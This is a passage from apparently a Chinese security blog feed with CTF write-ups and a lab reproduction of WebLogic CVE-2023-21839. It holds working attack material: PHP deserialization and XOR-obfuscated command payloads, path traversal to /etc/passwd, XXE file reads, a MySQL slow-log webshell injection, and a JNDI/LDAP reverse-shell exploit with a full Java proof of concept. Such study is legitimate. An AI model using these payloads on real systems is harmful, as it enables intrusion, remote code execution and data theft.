class="line">O:7:&quot;push_it&quot;:2:&#123;s:13:&quot;\000push_it\000root&quot;;s:84:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:12:&quot;\000push_it\000pwd&quot;;s:69:&quot;&quot;;s:3:&quot;pwd&quot;;O:7:&quot;pull_it&quot;:1:&#123;s:1:&quot;x&quot;;s:21:&quot;?&gt;&lt;?=`/???/??? /**`;?&gt;&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&quot;;s:3:&quot;pwd&quot;;O:7:&quot;pull_it&quot;:1:&#123;s:1:&quot;x&quot;;s:21:&quot;?&gt;&lt;?=`/???/??? /*`;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><br>==通配符 /???/???这个模拟/bin/cat cat根目录所有==</p>
<p>或者构造异或cat /f*:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%00&quot;^&quot;%60%60%7c%20%2f%60%2a&quot;);</span><br></pre></td></tr></table></figure><br>base64编码:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7</span><br></pre></td></tr></table></figure><br>脚本:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class pull_it &#123;  </span><br><span class="line">private $x;  </span><br><span class="line">function __construct($xx) &#123;  </span><br><span class="line">$this-&gt;x = $xx;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$l = new pull_it(urldecode(base64_decode(&quot;KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7&quot;));  </span><br><span class="line">echo urlencode(serialize($l)));</span><br></pre></td></tr></table></figure><br>得到:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A39%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%08%08%0F%01%0D%09%22%5E%22%7F%60%60%60%60%60%22%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure><br>最终payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&quot;;s:3:&quot;pwd&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A39%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%08%08%0F%01%0D%09%22%5E%22%7F%60%60%60%60%60%22%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure></p>
<h3 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h3><p>非预期:<br>提示访问hinder路由,发现<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">permission denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (url.startsWith(&quot;/hinder&quot;)) &#123;</span><br><span class="line">    response.setStatus(403);</span><br><span class="line">    response.getWriter().write(&quot;permission denied.&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>url编码绕过:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%68%69%6e%64%65%72/</span><br></pre></td></tr></table></figure><br>提示download路由<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download.action?filename=hint</span><br></pre></td></tr></table></figure><br>可以读文件:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%68%69%6e%64%65%72/download.action?filename=../../../../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><br>读了run.sh发现:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/oh_u_f1nd_me</span><br></pre></td></tr></table></figure><br>再读/oh_u_f1nd_me就行</p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-21839复现</title>
    <url>/2024/02/06/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B52/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Weblogic t3/iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象的getReferent方法,weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在var5 = var4.lookup(this.remoteJNDIName);实现，故可以通过rmi/ldap远程协议进行远程命令执行。</p>
<p>影响版本:</p>
<ul>
<li><p>12.2.1.3.0</p>
</li>
<li><p>12.2.1.4.0</p>
</li>
<li><p>14.1.1.0.0</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulhub/weblogic:12.2.1.3-2018</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 7001:7001 </span><br></pre></td></tr></table></figure>
<p>ifconfig看一下虚拟机对外网的ip<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213145346.png" alt="image.png"></p>
<p>物理机访问</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213145413.png" alt="image.png"></p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>Dnslog:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213150205.png" alt="image.png"></p>
<p>反弹shell<br>JNDI工具:<br><a href="https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4">https://github.com/WhiteHSBG/JNDIExploit/releases/tag/v1.4</a></p>
<p>我们先看一下kali的ip:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213151337.png" alt="image.png"></p>
<p> 172.31.9.255<br>启动JNDI<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 172.31.9.255</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213151400.png" alt="image.png"></p>
<p>然后kali设置一个监听端口,反弹shell用于接收shell的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 2222</span><br></pre></td></tr></table></figure><br>开始利用CVE工具<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar Weblogic-CVE-2023-21839.jar 192.168.254.128:7001 ldap://172.31.9.255:1389/Basic/ReverseShell/172.31.9.255/2222</span><br></pre></td></tr></table></figure></p>
<p>此时我们可以看到kali的2222端口已经收到shell<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213151540.png" alt="image.png"></p>
<p>进入容器检查一下<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213151656.png" alt="image.png"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们新建一个项目导入poc.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.deployment.jms.ForeignOpaqueReference;</span><br><span class="line"><span class="keyword">import</span> weblogic.iiop.IOPProfile;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 先赋值好用来反射的ForeignOpaqueReference的jndiEnvironment属性</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env2.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射来改变ForeignOpaqueReference的jndiEnvironment</span></span><br><span class="line">        <span class="type">ForeignOpaqueReference</span> <span class="variable">foreignOpaqueReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForeignOpaqueReference</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">jndiEnvironment</span> <span class="operator">=</span> ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">        jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        jndiEnvironment.set(foreignOpaqueReference, env2);</span><br><span class="line">        <span class="comment">//反射改remoteJNDIName属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">remoteJNDIName</span> <span class="operator">=</span> ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">        remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldap</span> <span class="operator">=</span> <span class="string">&quot;ldap://172.31.9.255:1389/Basic/ReverseShell/172.31.9.255/2222&quot;</span>;</span><br><span class="line">        remoteJNDIName.set(foreignOpaqueReference, ldap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建上下文进行lookup查询的weblogic服务器</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;t3://192.168.254.128:7001&quot;</span>; <span class="comment">// 目标机器</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env1.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env1.put(Context.PROVIDER_URL, url); <span class="comment">// 目标</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 远程绑定构造好的ForeignOpaqueReference对象</span></span><br><span class="line">        c.rebind(<span class="string">&quot;jmx0hxq&quot;</span>, foreignOpaqueReference);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// lookup查询之前绑定的ForeignOpaqueReference对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c.lookup(<span class="string">&quot;jmx0hxq&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里记得在项目结构里加个依赖,jar包: <a href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839/releases/tag/CVE-2023-21839">https://github.com/DXask88MA/Weblogic-CVE-2023-21839/releases/tag/CVE-2023-21839</a></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213181725.png" alt="image.png"></p>
<p>我们知道当客户端进行JNDI的查找和获取(lookup)的时候,最后会通过利用<code>WLNamingManager#getObjectInstance</code>获取我们的对象实例</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213190008.png" alt="image.png"></p>
<p>这里会判断如果远程对象是OpaqueReference类型就调用它的getReferent方法<br>如果是LinkRef类型会调用它的getLinkName方法<br>这里是调用远程对象的getReferent()方法,这里的远程对象是ForeignOpaqueReference<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213183208.png" alt="image.png"></p>
<p>我们发现这里的<code>var5 = var4.lookup(this.remoteJNDIName);</code>,这个var4我们可以通过反射传个jndiEnvironment(private属性)修改,这个remoteJNDIName也是private属性的,也只能通过反射修改</p>
<p>我们尝试复现:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213183729.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231213183758.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a href="https://xz.aliyun.com/t/12297#toc-2">https://xz.aliyun.com/t/12297#toc-2</a><br><a href="https://xz.aliyun.com/t/12452#toc-4">https://xz.aliyun.com/t/12452#toc-4</a><br><a href="https://okaytc.github.io/posts/942fc3b7.html#0x00%E3%80%81%E5%89%8D%E8%A8%80">https://okaytc.github.io/posts/942fc3b7.html#0x00%E3%80%81%E5%89%8D%E8%A8%80</a></p>
]]></content>
      <tags>
        <tag>CVE-2023-21839复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SYCTF2023</title>
    <url>/2024/02/06/SYCTF2023/</url>
    <content><![CDATA[<h3 id="CarelessPy"><a href="#CarelessPy" class="headerlink" title="CarelessPy"></a>CarelessPy</h3><p>主页面的源代码提示了/eval路由和/login路由和一个任意文件下载<code>/download?file=zayu2.jpg</code>,eval路由可以传参cmd文件的路径来回显ls操作<br>任意文件下载做了限制不能读flag和app.py,这里我们可以读<strong>pycache</strong>文件夹里面的part.cpython-311.pyc,然后pyc反编译<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download?file=../../__pycache__/part.cpython-311.pyc</span><br></pre></td></tr></table></figure><br>反编译的结果:<br><img src="https://s2.loli.net/2023/09/29/FmMseUiVSkcIyGH.png" alt="image.png"><br>然后去修改session:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJpc2xvZ2luIjp0cnVlfQ.ZRbAvg.y0__DjYK72pGaxry8UGzza9Dp8A</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/09/29/On21goLqJV9RQma.png" alt="image.png"><br>修改session得到提示<br><img src="https://s2.loli.net/2023/09/29/wf2A1MNmTeyHudo.png" alt="image.png"><br>去/th1s_1s_The_L4st_one路由,发现是个xxe页面,而且没有过滤<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [&lt;!ENTITY abc SYSTEM &quot;file:///flag&quot; &gt;]&gt;  </span><br><span class="line">&lt;result&gt;  </span><br><span class="line">&lt;ctf&gt;aa&lt;/ctf&gt;  </span><br><span class="line">&lt;web&gt;$abc&lt;/web&gt;  </span><br><span class="line">&lt;/result&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;o2takuXX_l1k4_p1@y_ArkN1ghtS&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h3><p>打开主页面是一个机器人对话框随便输入一个值有get传参,怀疑sql注入,上sqlmap扫一下发现能一把梭,看一下数据库结构<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] robot_data</span><br><span class="line">[*] test</span><br><span class="line"></span><br><span class="line">robot_data:</span><br><span class="line">   有一个name表:</span><br><span class="line">    username                            |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| Hacker                              |</span><br><span class="line">| secret is in /sEcR@t_n@Bodyknow.php |</span><br><span class="line">+-------------------------------------</span><br></pre></td></tr></table></figure><br>发现<code>/sEcR@t_n@Bodyknow.php</code>,这里可以传输执行SQL语句,那个开始挑战要输入十个数字和它猜拳,<br>在这个输入框里执行sql语句发现用户变成了secret了,可以看到一个game表,里面有字段,发现那个表是空的<br>结合源代码的<code>&lt;!-- 机器人的游戏策略：for($i=1;$i&lt;=10;$i++)&#123; $choice=&quot;SELECT choice FROM</code>game<code>WHERE round=&#39;$i&#39;&quot;; &#125;--&gt;</code>可知这次考点也是主从复制</p>
<h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>先<code>select version()</code>得到MySQL版本是10.3.20-MariaDB<br>docker开一个相同版本的MySQL<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull mariadb-10.3.20</span><br><span class="line"></span><br><span class="line">docker run -d -p 3306:3306 --name mariadb-10.3.20 -e MYSQL_ROOT_PASSWORD=root mariadb:10.3.20</span><br><span class="line"></span><br><span class="line">docker exec -it mariadb-10.3.20 mysql -uroot -p</span><br></pre></td></tr></table></figure><br>配置:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker进入容器后</span><br><span class="line">vim /etc/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">server-id = 1</span><br><span class="line">log-bin=/var/log/mysql/mariadb-bin</span><br><span class="line">binlog-do-db=game_data</span><br><span class="line"></span><br><span class="line">然后重启mysql:</span><br><span class="line">service restart mysql</span><br><span class="line"></span><br><span class="line">容器也重启一下:</span><br><span class="line">docker restart mariadb-10.3.20</span><br><span class="line"></span><br><span class="line">进入mysql shell执行:</span><br><span class="line"></span><br><span class="line">CREATE USER &#x27;slave&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;;</span><br><span class="line">GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;slave&#x27;@&#x27;%&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">主服务器执行:</span><br><span class="line">CREATE DATABASE IF NOT EXISTS game_data;</span><br><span class="line">use game_data</span><br><span class="line">CREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;</span><br><span class="line"></span><br><span class="line">执行show master status;</span><br><span class="line">记住这里的:</span><br><span class="line">file: master-bin.000001</span><br><span class="line">position:1126</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">题目页面:</span><br><span class="line"></span><br><span class="line">CHANGE MASTER TO MASTER_HOST=&#x27;111.229.158.40&#x27;, MASTER_USER=&#x27;slave&#x27;,</span><br><span class="line">MASTER_PASSWORD=&#x27;123456&#x27;, MASTER_LOG_FILE=&#x27;mariadb-bin.000001&#x27;,MASTER_LOG_POS=1126,master_connect_retry=30;</span><br><span class="line"></span><br><span class="line">start slave;</span><br><span class="line"></span><br><span class="line">show slave status;</span><br><span class="line">如果SlaveIORunning 和 SlaveSQLRunning的值都是Yes,代表你配置成功了</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/09/30/7EOUoC9I6zgfuT2.png" alt="屏幕截图 2023-09-30 150817.png"><br>可以看到两个连着的YES<br>vps的mysqlshell:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO game ( round , choice ) VALUES (&#x27;1&#x27;, &#x27;R&#x27;), (&#x27;2&#x27;, &#x27;R&#x27;),(&#x27;3&#x27;, &#x27;R&#x27;), (&#x27;4&#x27;, &#x27;R&#x27;),(&#x27;5&#x27;, &#x27;R&#x27;), (&#x27;6&#x27;, &#x27;R&#x27;),(&#x27;7&#x27;,&#x27;R&#x27;), (&#x27;8&#x27;, &#x27;R&#x27;),(&#x27;9&#x27;, &#x27;R&#x27;), (&#x27;10&#x27;, &#x27;R&#x27;);</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/09/30/GcR7j8K9qlOnzN2.png" alt="屏幕截图 2023-09-30 150958.png"></p>
<p>输入10个P得到flag</p>
<h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解:"></a>非预期解:</h4><h5 id="慢日志注入"><a href="#慢日志注入" class="headerlink" title="慢日志注入"></a>慢日志注入</h5><p>可以参考我这篇文章<a href="https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/">慢日志注入</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set GLOBAL log_queries_not_using_indexes=on;</span><br><span class="line"></span><br><span class="line">set GLOBAL slow_query_log=on;</span><br><span class="line">set GLOBAL slow_query_log_file=&#x27;/var/www/html/sEcR@t_n@Bodyknow.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]);phpinfo();?&gt;&#x27; from mysql.db where sleep(11);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=system(&quot;cat /var/www/html/game.php&quot;);</span><br></pre></td></tr></table></figure>
<p>找到flag</p>
<h3 id="4号的罗纳尔多"><a href="#4号的罗纳尔多" class="headerlink" title="4号的罗纳尔多"></a>4号的罗纳尔多</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;VanZZZZY&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;VanZZZZY&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;givemegirlfriend!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]+|Array|Iterator|Object|List/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则匹配参考极客2022的rceus用__halt_compiler();绕过,反序列化的正则用C绕过,可以参考<a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">这篇</a>,过滤了</p>
<ul>
<li>ArrayObject::unserialize</li>
<li>ArrayIterator::unserialize</li>
<li>RecursiveArrayIterator::unserialize<br>这题如果用SplStack::unserialize<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:8:&quot;SplStack&quot;:100:&#123;i:6;:a:1:&#123;s:4:&quot;evil&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:45:&quot;eval(end(getallheaders()));__halt_compiler();&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<img src="https://s2.loli.net/2023/10/03/O4PrJypNQXGkR93.png" alt="image.png"><br>读根目录的flag发现是假的,flag.sh里发现:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">gcc /tmp/siuuuuuu.c -o /tmp/siuuuuuu</span><br><span class="line">strip /tmp/siuuuuuu</span><br><span class="line">rm /tmp/siuuuuuu.c</span><br><span class="line">mkdir /tmp/cristiano</span><br><span class="line">mkdir /tmp/cristiano/siuuu</span><br><span class="line">mv /tmp/siuuuuuu /tmp/cristiano/siuuu/siuuuuuu</span><br><span class="line">chmod 000 /tmp/cristiano/siuuu/siuuuuuu</span><br><span class="line">chmod +r /tmp/cristiano/siuuu/siuuuuuu</span><br></pre></td></tr></table></figure>
在/tmp/siuuu.py里发现flag<br><img src="https://s2.loli.net/2023/10/03/lnKJ52Ybtpj1MGC.png" alt="image.png"><br>后来看了官方flag发现本来要考一个rc4的,在/tmp/cristiano/siuuu/siuuuuuu里发现被编译后的c文件,base64dump出来.cyber保存出来放进ida里,shift+f12找密钥:<img src="https://s2.loli.net/2023/10/03/qlOfNRE5k3DoM9z.png" alt="image.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Myth3meneedgirlfriend,pleaseaddqq2350721437</span><br></pre></td></tr></table></figure>
再用rc4解密密文即可</li>
</ul>
<p>参考:<br>官方flag:<a href="https://www.kdocs.cn/l/cmbPrknYHg1V">https://www.kdocs.cn/l/cmbPrknYHg1V</a></p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界刷题1</title>
    <url>/2024/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%981/</url>
    <content><![CDATA[<h3 id="ez-curl"><a href="#ez-curl" class="headerlink" title="ez_curl"></a>ez_curl</h3><p>考点:</p>
<ul>
<li>nodejs的parameterLimit1000个限制</li>
<li>RFC 7230,header字段可以通过在每一行前面至少加一个SP(空格)或HT(制表)来扩展到多行,node正好支持</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">flag</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">query</span>.<span class="property">admin</span>.<span class="title function_">includes</span>(<span class="string">&#x27;false&#x27;</span>) &amp;&amp; req.<span class="property">headers</span>.<span class="property">admin</span>.<span class="title function_">includes</span>(<span class="string">&#x27;true&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(&#123; <span class="attr">port</span>: port , <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>向flag路由发包,获取flag有两个条件:</p>
<ol>
<li>请求参数admin不能包括false</li>
<li>请求包的请求头的admin键的值要包含true</li>
</ol>
<p>php代码:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$headers</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>);</span><br><span 